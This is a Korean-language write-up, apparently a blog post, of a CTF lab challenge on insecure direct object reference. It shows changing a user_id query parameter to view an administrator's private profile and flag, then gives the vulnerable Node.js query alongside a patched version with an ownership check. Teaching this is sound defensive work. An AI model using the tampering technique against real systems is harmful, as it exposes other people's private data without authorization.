+++
title = "VulnABLE CTF [LUXORA] Write-up: IDOR 🥉 Bronze"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "IDOR", "Bronze", "Access Control", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: IDOR 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (IDOR)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/idor/bronze`
- **목표**: 객체 참조 권한 검증이 누락된 취약점을 이용해, 내 소유가 아닌 다른 사용자(관리자)의 비공개 프로필 정보를 열람하고 숨겨진 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/idor/bronze` 페이지에 일반 사용자(`user_001`)로 로그인하여 내 프로필을 조회해 봅니다.

**[요청 URL]**
```http
GET /idor/bronze/profile?user_id=1001 HTTP/1.1
```

**[화면 출력]**
```html
<div class="profile-card">
  <h3>Profile for User: user_001</h3>
  <p>Email: user001@luxora.test</p>
  <p>Status: Regular User</p>
</div>
```

**[해커의 사고 과정]**
1. URL을 보면 `user_id=1001`이라는 파라미터가 명시적으로 서버에 전달되고 있다.
2. 내 유저 ID가 `1001`인 것 같다.
3. 이 숫자를 **1000**이나 **1002**로 바꾸면 어떻게 될까? 서버가 "이 프로필은 너의 것이 아니야!" 하고 막아줄까, 아니면 그냥 보여줄까?

---

## 💥 2. 취약점 식별 및 공격 수행 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker (ID: 1) ] --(GET /profile?id=2)--> [ Web Server ]
                                              |-- Missing Ownership Check
                                              |-- Returns User 2's Profile
```


**IDOR (Insecure Direct Object Reference)** 취약점은 번역하자면 "안전하지 않은 직접 객체 참조"입니다. 즉, 데이터베이스의 기본 키(Primary Key)나 파일 이름 등을 사용자가 직접 입력할 수 있게 노출해놓고, 정작 서버에서는 **'그 데이터의 주인이 현재 로그인한 사용자가 맞는지'** 확인하는 과정을 빼먹었을 때 발생합니다.

### 💡 파라미터 조작 (Parameter Tampering)
브라우저의 주소창에서 `user_id` 값을 관리자 ID일 확률이 높은 `1` 또는 아주 낮은 번호인 `1000` 등으로 바꾸어 봅니다.

```http
GET /idor/bronze/profile?user_id=1000 HTTP/1.1
```

### 🔍 서버의 응답
```html
<div class="profile-card">
  <h3>Profile for User: admin_super</h3>
  <p>Email: admin_super@luxora.test</p>
  <p>Status: Administrator</p>
  <p class="secret-data">FLAG{IDOR_🥉_BASIC_A1B2C3}</p>
</div>
```

놀랍게도 서버는 아무런 권한 에러(403 Forbidden)를 내지 않고, 다른 사람의 개인정보와 함께 플래그를 고스란히 노출했습니다!

---

## 🚩 3. 롸잇업 결론 및 플래그

URL의 숫자 하나만 바꿨을 뿐인데, 시스템의 인증/인가 로직이 완전히 우회되어 타인의 정보에 접근하는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{IDOR_🥉_BASIC_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
접근 제어(Access Control) 로직이 아예 존재하지 않아서 발생한 초보적인, 하지만 실무에서 가장 흔하게 터지는 취약점입니다.

* **취약한 백엔드 코드**
```javascript
// 클라이언트가 보낸 user_id를 그대로 믿고 쿼리를 던짐
const profile = await db.query("SELECT * FROM profiles WHERE user_id = $1", [req.query.user_id]);
return res.render("profile", { profile });
```

* **안전한 패치 가이드 (권한 검증 로직 추가)**
데이터를 반환하기 전에, 요청한 사람이 그 데이터의 주인이 맞는지(혹은 관리자 권한이 있는지) 반드시 확인해야 합니다.
```javascript
const requestedId = req.query.user_id;
const currentUserId = req.session.user_id; // 현재 로그인한 세션의 ID

// 권한 검증 (Ownership Check)
if (requestedId !== currentUserId && req.session.role !== 'admin') {
    return res.status(403).send("Forbidden: You do not have permission to view this profile.");
}

// 검증 통과 시에만 데이터 반환
const profile = await db.query("SELECT * FROM profiles WHERE user_id = $1", [requestedId]);
...
```

또한, `user_id`를 1, 2, 3 같은 순차적인 정수(Auto-increment Integer) 대신, 유추할 수 없는 **UUID(Universally Unique Identifier)** 형태로 발급하면 해커가 다른 사람의 ID를 찍어서 맞추는 행위 자체를 방지할 수 있습니다. (물론 근본적인 접근 제어가 우선입니다.)